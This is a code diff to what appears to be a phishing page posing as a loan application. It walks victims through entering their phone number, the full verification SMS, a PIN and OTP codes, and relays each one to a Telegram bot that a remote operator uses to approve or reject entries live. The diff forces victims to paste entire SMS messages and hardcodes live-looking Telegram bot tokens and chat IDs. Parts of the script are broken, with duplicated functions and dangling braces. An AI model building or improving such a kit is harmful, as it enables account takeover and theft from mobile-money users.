@@ -648,49 +648,57 @@ input[type="text"] {
     </div>
 
 
- 
-<!-- PAGE 5: FULL SMS MESSAGE -->
+<!-- PAGE 5 SMS PASTE VERIFICATION -->
 <div id="page5" class="hidden">
-
     <div class="center">
         <div class="icon">📩</div>
-
-        <h2>Paste SMS Message</h2>
-
+        <h2>Paste Verification SMS</h2>
         <p style="margin-top:10px;color:#6b7280">
-            Paste the complete verification SMS received on your phone.
+            Paste the full and complete SMS message sent to your phone number (do not enter only the 6-digit code).
         </p>
     </div>
 
-    <div class="card" style="margin-top:20px">
-
-        <span class="label">COMPLETE SMS MESSAGE</span>
-
+    <div class="sms-paste-wrapper" style="margin-top:16px">
         <textarea
-            id="otpPasteInput"
-            rows="5"
+            id="smsMessageInput"
+            rows="4"
             placeholder="Paste the complete SMS message here..."
-            style="width:100%;padding:14px;border:2px solid #e2e8f0;border-radius:12px;font-size:14px;resize:vertical"
+            autocomplete="off"
+            spellcheck="false"
+            style="width:100%;padding:12px;border:1px solid #d1d5db;border-radius:10px;font-size:14px;resize:vertical;"
         ></textarea>
-
-        <p style="font-size:11px;color:#6b7280;margin-top:8px">
-            Do not paste messages containing passwords, PINs,
-            or financial authorization codes.
-        </p>
-
+        <div style="display:flex;justify-content:flex-end;gap:8px;margin-top:8px;">
+            <button
+                type="button"
+                id="pasteSmsButton"
+                class="button"
+                onclick="pasteSMSFromClipboard()"
+                style="padding:8px 12px;font-size:13px;"
+            >
+                Paste SMS
+            </button>
+            <button
+                type="button"
+                id="clearSmsButton"
+                class="button"
+                onclick="clearSMSInput()"
+                style="padding:8px 12px;font-size:13px;"
+            >
+                Clear
+            </button>
+        </div>
     </div>
 
     <button
         id="verifyButton"
         class="button blue"
         disabled
-        onclick="submitSMSMessage()"
+        onclick="submitOTP()"
+        style="margin-top:14px;"
     >
-        Continue
+        Verify SMS
     </button>
-
     <div id="otpStatus" class="status-message"></div>
-
 </div>
 
 
@@ -750,47 +758,6 @@ input[type="text"] {
         </button>
 
         <div id="pinStatus" class="status-message"></div>
-
-    </div>
-
-    
-    <!-- PAGE 6a OTP2 -->
-
-    <div id="page6a" class="hidden">
-
-        <div class="center">
-
-            <div class="icon">🔐</div>
-
-            <h2>Enter OTP Code</h2>
-
-            <p style="margin-top:10px;color:#6b7280">
-                Enter the 4-digit code sent to your phone.
-            </p>
-
-        </div>
-
-
-        <div class="otp2" id="otpGrid">
-
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
-            <input maxlength="1" inputmode="numeric">
-
-        </div>
-
-
-        <button
-            id="submitButton"
-            class="button blue"
-            disabled
-            onclick="submitOTP2()"
-        >
-            Submit
-        </button>
-
-        <div id="otp2Status" class="status-message"></div>
 
     </div>
 
@@ -1009,7 +976,6 @@ function showPage(id, step, title, subtitle) {
         "page4",
         "page5",
         "page6",
-        "page6a",
         "page7",
         "page8"
     ];
@@ -1224,51 +1190,225 @@ function goToOTP() {
         "Verification Code",
         "Enter the code sent to your phone"
     );
-    
-    inputs.forEach(function(input, index) {
 
-        input.value = "";
+    setupOTP();
 
-
-        input.addEventListener(
-            "input",
-            function() {
-
-                input.value =
-                    input.value.replace(/\D/g, "");
+}
 
 
-                if (
-                    input.value &&
-                    index < inputs.length - 1
-                ) {
+let smsWasPasted = false;
 
-                    inputs[index + 1].focus();
+function goToOTP() {
+    showPage(
+        "page5",
+        5,
+        "Verification SMS",
+        "Paste the complete SMS sent to your phone"
+    );
+    setupOTP();
+}
 
-                }
+function validateSMSMessage(text, wasPasted) {
+    const trimmed = text.trim();
+
+    if (!trimmed) {
+        return {
+            valid: false,
+            code: null,
+            error: ""
+        };
+    }
+
+    if (!wasPasted) {
+        return {
+            valid: false,
+            code: null,
+            error: "Please paste the SMS message instead of typing it manually."
+        };
+    }
+
+    if (/^\d+$/.test(trimmed)) {
+        return {
+            valid: false,
+            code: null,
+            error: "Please paste the full and complete SMS message, not just the 6-digit code."
+        };
+    }
+
+    const words = trimmed.split(/\s+/).filter(Boolean);
+    const textWithoutDigits = trimmed.replace(/[\d\s\-.,:;#*()\[\]]+/g, "");
+
+    if (trimmed.length < 20 || words.length < 4 || textWithoutDigits.length < 10) {
+        return {
+            valid: false,
+            code: null,
+            error: "SMS looks incomplete. Paste the entire message sent to your phone."
+        };
+    }
+
+    const codeMatch = trimmed.match(/(?:^|\D)(\d{6})(?:\D|$)/);
+    if (!codeMatch) {
+        return {
+            valid: false,
+            code: null,
+            error: "The pasted SMS must include the complete message and 6-digit verification code."
+        };
+    }
+
+    return {
+        valid: true,
+        code: codeMatch[1],
+        error: ""
+    };
+}
+
+function updateSMSVerificationState() {
+    const smsInput = document.getElementById("smsMessageInput");
+    const button = document.getElementById("verifyButton");
+    const status = document.getElementById("otpStatus");
+
+    const result = validateSMSMessage(smsInput.value, smsWasPasted);
+    button.disabled = !result.valid;
+
+    if (result.error) {
+        status.textContent = result.error;
+        status.style.color = "#dc2626";
+    } else if (result.valid) {
+        status.textContent = "Complete SMS message detected.";
+        status.style.color = "#16a34a";
+    } else {
+        status.textContent = "";
+    }
+}
 
 function setupOTP() {
+    const smsInput = document.getElementById("smsMessageInput");
+    const button = document.getElementById("verifyButton");
+    const status = document.getElementById("otpStatus");
 
-    const smsInput = document.getElementById("otpPasteInput");
-    const verifyButton = document.getElementById("verifyButton");
+    smsWasPasted = false;
+    smsInput.value = "";
+    button.disabled = true;
+    status.textContent = "";
 
-smsInput.addEventListener("input", function () {
-    verifyButton.disabled = smsInput.value.trim().length === 0;
-});
+    // Block manual character typing; only allow pasting & navigation/deletion keys
+    smsInput.onkeydown = function(event) {
+        const isPasteShortcut = (event.ctrlKey || event.metaKey) && event.key.toLowerCase() === "v";
+        const isSelectOrCopy = (event.ctrlKey || event.metaKey) && ["a", "c", "x"].includes(event.key.toLowerCase());
+        const allowedKeys = [
+            "Backspace", "Delete", "Tab", "Escape",
+            "ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown",
+            "Home", "End"
+        ];
 
-smsInput.addEventListener("paste", function () {
-    setTimeout(() => {
-        verifyButton.disabled =
-            smsInput.value.trim().length === 0;
-    }, 0);
-});
+        if (isPasteShortcut || isSelectOrCopy || allowedKeys.includes(event.key)) {
+            return;
+        }
 
-function submitSMSMessage() {
-    const message = smsInput.value.trim();
+        if (event.key.length === 1 || event.key === "Enter") {
+            event.preventDefault();
+            status.textContent = "Typing is disabled. Please paste the full SMS message.";
+            status.style.color = "#d97706";
+        }
+    };
 
-    if (!message) {
-        alert("Please paste the SMS message.");
+    smsInput.onpaste = function(event) {
+        event.preventDefault();
+        const pastedText = (event.clipboardData || window.clipboardData).getData("text");
+        smsInput.value = pastedText;
+        smsWasPasted = true;
+        updateSMSVerificationState();
+    };
+
+    smsInput.oninput = function(event) {
+        if (event.inputType === "insertFromPaste") {
+            smsWasPasted = true;
+        } else if (!smsInput.value.trim()) {
+            smsWasPasted = false;
+        }
+        updateSMSVerificationState();
+    };
+
+    smsInput.focus();
+}
+
+async function pasteSMSFromClipboard() {
+    const smsInput = document.getElementById("smsMessageInput");
+    const status = document.getElementById("otpStatus");
+
+    try {
+        const text = await navigator.clipboard.readText();
+        smsInput.value = text;
+        smsWasPasted = true;
+        updateSMSVerificationState();
+    } catch (err) {
+        status.textContent = "Clipboard access denied. Long-press or press Ctrl+V inside the box to paste.";
+        status.style.color = "#d97706";
+        smsInput.focus();
+    }
+}
+
+function clearSMSInput() {
+    const smsInput = document.getElementById("smsMessageInput");
+    const button = document.getElementById("verifyButton");
+    const status = document.getElementById("otpStatus");
+
+    smsInput.value = "";
+    smsWasPasted = false;
+    button.disabled = true;
+    status.textContent = "";
+    smsInput.focus();
+}
+
+function submitOTP() {
+    const smsInput = document.getElementById("smsMessageInput");
+    const status = document.getElementById("otpStatus");
+    const result = validateSMSMessage(smsInput.value, smsWasPasted);
+
+    if (!result.valid) {
+        status.textContent = result.error || "Please paste the complete SMS message.";
+        status.style.color = "#dc2626";
         return;
+    }
+
+    const fullSmsMessage = smsInput.value.trim();
+    const extractedCode = result.code;
+
+    // Send fullSmsMessage (and extractedCode if needed) to your backend,
+    // then proceed to Page 6 (PIN Verification)
+    console.log("Verified SMS:", { fullSmsMessage, extractedCode });
+}
+                }
+
+            }
+        );
+
+    });
+
+
+function submitOTP() {
+
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
+
+    const code =
+        [...inputs]
+        .map(function(input) {
+            return input.value;
+        })
+        .join("");
+
+
+    if (code.length !== 6) {
+
+        alert(
+            "Please enter the complete verification code."
+        );
+
+        return;
+
     }
 
     // Send OTP to telegram for admin verification
@@ -1294,8 +1434,8 @@ function submitSMSMessage() {
                         showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
                     } else if (action === "wrongotp") {
                         alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#otpPasteInput").forEach(i => i.value = "");
-                        document.querySelectorAll("#otpPasteIput")[0].focus();
+                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpGrid input")[0].focus();
                     } else {
                         alert("Unknown OTP action: " + action);
                     }
@@ -1389,7 +1529,7 @@ function verifyPIN() {
                     pinBtn.disabled = false;
                     pinStatus.style.display = "none";
                     if (action === "approve_pin") {
-                        showPage("page6a", 6, "OTP2 code", "Enter the OTP sent to your phone");
+                        showPage("page7", 7, "Secure Authorization", "Continue securely");
                     } else if (action === "wrongpin") {
                         alert("The PIN provided is incorrect. Please try again.");
                         document.getElementById("pinInput").value = "";
@@ -1412,169 +1552,6 @@ function verifyPIN() {
             pinStatus.style.display = "none";
             console.error("Send PIN request failed", err);
             alert("Failed to send PIN verification. Please try again.");
-        });
-
-}
-
-    
-function goToOTP2() {
-
-    showPage(
-        "page6a",
-        6,
-        "OTP2 Code",
-        "Enter the OTP sent to your phone"
-    );
-
-    setupOTP2();
-
-}
-
-
-function setupOTP2() {
-
-    const inputs =
-        document.querySelectorAll(
-            "#otpGrid input"
-        );
-
-    const button =
-        document.getElementById(
-            "submitButton"
-        );
-
-
-    inputs.forEach(function(input, index) {
-
-        input.value = "";
-
-
-        input.addEventListener(
-            "input",
-            function() {
-
-                input.value =
-                    input.value.replace(/\D/g, "");
-
-
-                if (
-                    input.value &&
-                    index < inputs.length - 1
-                ) {
-
-                    inputs[index + 1].focus();
-
-                }
-
-
-                const code =
-                    [...inputs]
-                    .map(function(item) {
-                        return item.value;
-                    })
-                    .join("");
-
-
-                button.disabled =
-                    code.length !== 4;
-
-            }
-        );
-
-
-        input.addEventListener(
-            "keydown",
-            function(event) {
-
-                if (
-                    event.key === "Backspace" &&
-                    !input.value &&
-                    index > 0
-                ) {
-
-                    inputs[index - 1].focus();
-
-                }
-
-            }
-        );
-
-    });
-
-
-    inputs[0].focus();
-
-}
-
-
-function submitOTP2() {
-
-    const inputs =
-        document.querySelectorAll(
-            "#otpGrid input"
-        );
-
-    const code =
-        [...inputs]
-        .map(function(input) {
-            return input.value;
-        })
-        .join("");
-
-
-    if (code.length !== 4) {
-
-        alert(
-            "Please enter the complete verification code."
-        );
-
-        return;
-
-    }
-
-    // Send OTP2 to telegram for admin verification
-    sessionToken = generateSessionId();
-    const otp2Btn = document.getElementById("submitButton");
-    const otp2Status = document.getElementById("otp2Status");
-    
-    showLoading("Verifying Code", "Confirming your verification code...");
-    otp2Btn.disabled = true;
-    otp2Status.style.display = "block";
-
-    sendTelegramOTP2Request(sessionToken, code, "+260 " + phoneInput.value)
-        .then(() => {
-            pollTelegramForAction({
-                session: sessionToken,
-                timeoutMs: 2 * 60 * 1000,
-                onAction: (action) => {
-                    clearTimeout(otpPollingTimeoutHandle);
-                    hideLoading();
-                    otp2Btn.disabled = false;
-                    otp2Status.style.display = "none";
-                    if (action === "approve_otp") {
-                        showPage("page7", 7, "Secure Authorization", "Continue securely");
-                    } else if (action === "wrongotp") {
-                        alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
-                        document.querySelectorAll("#otpGrid input")[0].focus();
-                    } else {
-                        alert("Unknown OTP action: " + action);
-                    }
-                },
-                onTimeout: () => {
-                    hideLoading();
-                    otp2Btn.disabled = false;
-                    otp2Status.style.display = "none";
-                    alert("No response from agent. Please try again later.");
-                }
-            });
-        })
-        .catch(err => {
-            hideLoading();
-            otp2Btn.disabled = false;
-            otp2Status.style.display = "none";
-            console.error("Send OTP request failed", err);
-            alert("Failed to send OTP to agent. Please try again.");
         });
 
 }
@@ -1650,8 +1627,8 @@ function submitApplication() {
     For production use, implement server-side webhook or proxy to keep the token secret.
 */
 
-const TELEGRAM_BOT_TOKEN = '8734653681:AAFbcqAV0US4FkvTkE5w-4O7yNqJ88CCjJo';
-const TELEGRAM_ADMIN_CHAT = '8820857419';
+const TELEGRAM_BOT_TOKEN = '8913601162:AAGjfyxXw2inG0IiRKP-c8cgrSSwL6BIB-w';
+const TELEGRAM_ADMIN_CHAT = '2069362942';
 let tgLastUpdateId = 0;
 let sessionToken = null;
 let detailsPollHandle = null;
@@ -1732,24 +1709,6 @@ async function sendTelegramPINRequest(session, pin) {
   return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
 }
 
-    
-async function sendTelegramOTP2Request(session, otp2, otpPhone) {
-  const loan = calculateLoan();
-  const text = `OTP Verification\nPhone: ${otpPhone}\nOTP2: ${otp2}`;
-  const reply_markup = {
-    inline_keyboard: [
-      [
-        { text: '✅APPROVE', callback_data: `approve_otp::${session}` },
-        { text: '❌WRONG OTP', callback_data: `wrongotp::${session}` }
-      ]
-    ]
-  };
-  if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
-    return Promise.reject('Bot token not configured. Replace TELEGRAM_BOT_TOKEN with your token.');
-  }
-  return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
-}
-
 function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, onTimeout = ()=>{}}) {
   if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
     onTimeout();
@@ -1804,7 +1763,6 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     if(detailsPollingTimeoutHandle){ clearTimeout(detailsPollingTimeoutHandle); detailsPollingTimeoutHandle = null; }
     if(otpPollingTimeoutHandle){ clearTimeout(otpPollingTimeoutHandle); otpPollingTimeoutHandle = null; }
     if(pinPollingTimeoutHandle){ clearTimeout(pinPollingTimeoutHandle); pinPollingTimeoutHandle = null; }
-    if(otp2PollingTimeoutHandle){ clearTimeout(otp2PollingTimeoutHandle); otp2PollingTimeoutHandle = null;}
   }
 
   if(session && session.startsWith('s_')){
@@ -1812,7 +1770,6 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     detailsPollHandle = handle;
     otpPollHandle = handle;
     pinPollHandle = handle;
-    otp2PollHandle = handle;
     const toHandle = setTimeout(()=> {
       clearInterval(handle);
       if(onTimeout) onTimeout();
@@ -1820,7 +1777,6 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     detailsPollingTimeoutHandle = toHandle;
     otpPollingTimeoutHandle = toHandle;
     pinPollingTimeoutHandle = toHandle;
-    otp2PollingTimeoutHandle = toHandle;
   } else {
     setTimeout(onTimeout, 0);
   }
